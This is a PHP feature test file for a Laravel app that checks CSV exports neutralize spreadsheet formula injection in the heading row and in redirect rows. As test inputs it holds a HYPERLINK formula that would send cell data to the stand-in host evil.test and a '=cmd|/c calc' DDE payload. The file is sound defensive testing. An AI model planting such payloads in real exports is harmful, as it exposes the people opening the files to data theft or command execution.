<?php

namespace Tests\Feature\Mgmt;

use App\Models\Management\Space;
use App\Models\Management\Storage;
use App\Models\Space\Asset;
use App\Models\Space\Redirect;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;
use Tests\Traits\SpaceTestingTrait;

/**
 * Excel, LibreOffice and Sheets evaluate a cell whose text starts with `=`,
 * `+`, `-` or `@`. The row values were already escaped; the heading row was
 * not, and asset field names are tenant-controlled — so the payload just moved
 * one row up.
 */
class CsvExportEscapingTest extends TestCase
{
    use RefreshDatabase;
    use SpaceTestingTrait;

    protected User $user;

    protected Space $space;

    protected Storage $storage;

    protected function setUp(): void
    {
        parent::setUp();

        $this->user = User::factory()->create();
        $this->space = Space::factory()->create();
        $this->assignSpaceRole($this->space, $this->user, 'owner');

        $this->storage = Storage::factory()->create([
            'space_id' => $this->space->id,
            'is_default' => true,
            'config' => ['root' => storage_path("app/spaces/{$this->space->id}")],
            'driver' => 'local',
            'state' => 'live',
        ]);

        $this->setUpSpaceTesting($this->space);
        app()->instance('currentSpace', $this->space);
    }

    #[Test]
    public function a_formula_in_an_asset_field_name_is_neutralized_in_the_heading_row(): void
    {
        $this->space->settings = [
            ...$this->space->settings->toArray(),
            'asset_fields' => [
                ['key' => '=HYPERLINK("https://evil.test/?d="&A2,"Open")', 'label' => 'Alt', 'required' => false],
            ],
        ];
        $this->space->save();
        app()->instance('currentSpace', $this->space->fresh());

        $this->createAsset();

        $heading = $this->firstLineOf(
            $this->actingAs($this->user)
                ->post("/mgmt/v1/spaces/{$this->space->id}/assets/export", ['as' => 'csv'])
                ->assertOk()
                ->streamedContent()
        );

        $this->assertStringContainsString('\'=HYPERLINK', $heading);
        $this->assertDoesNotMatchRegularExpression('/(^|,)"?=HYPERLINK/', $heading);
    }

    #[Test]
    public function an_ordinary_field_name_is_left_alone(): void
    {
        $this->space->settings = [
            ...$this->space->settings->toArray(),
            'asset_fields' => [
                ['key' => 'alt', 'label' => 'Alt', 'required' => false],
            ],
        ];
        $this->space->save();
        app()->instance('currentSpace', $this->space->fresh());

        $this->createAsset();

        $heading = $this->firstLineOf(
            $this->actingAs($this->user)
                ->post("/mgmt/v1/spaces/{$this->space->id}/assets/export", ['as' => 'csv'])
                ->assertOk()
                ->streamedContent()
        );

        $this->assertSame('id,filename,full_url,alt', trim($heading));
    }

    #[Test]
    public function redirect_export_still_streams_its_rows(): void
    {
        Redirect::query()->create([
            'source' => '/from-a',
            'target' => '/to-a',
            'status_code' => 301,
        ]);
        Redirect::query()->create([
            'source' => '=cmd|/c calc',
            'target' => '/to-b',
            'status_code' => 302,
        ]);

        $body = $this->actingAs($this->user)
            ->post("/mgmt/v1/spaces/{$this->space->id}/redirects/export", ['as' => 'csv'])
            ->assertOk()
            ->streamedContent();

        $lines = array_values(array_filter(explode("\n", trim($body))));

        $this->assertSame('id,external_id,source,target,status_code', trim($lines[0]));
        $this->assertCount(3, $lines);
        $this->assertStringContainsString('/from-a', $body);
        $this->assertStringContainsString('\'=cmd|/c calc', $body);
    }

    /**
     * The heading row only lists fields that some asset actually carries, so
     * an export needs at least one asset to have any columns beyond the base.
     */
    private function createAsset(): void
    {
        $asset = new Asset;
        $asset->forceFill([
            'external_id' => (string) Str::uuid(),
            'filename' => 'photo.jpg',
            'extension' => 'jpg',
            'mime_type' => 'image/jpeg',
            'storage_id' => $this->storage->id,
            'size' => 100,
        ])->save();
    }

    private function firstLineOf(string $body): string
    {
        return strtok($body, "\n") ?: '';
    }
}
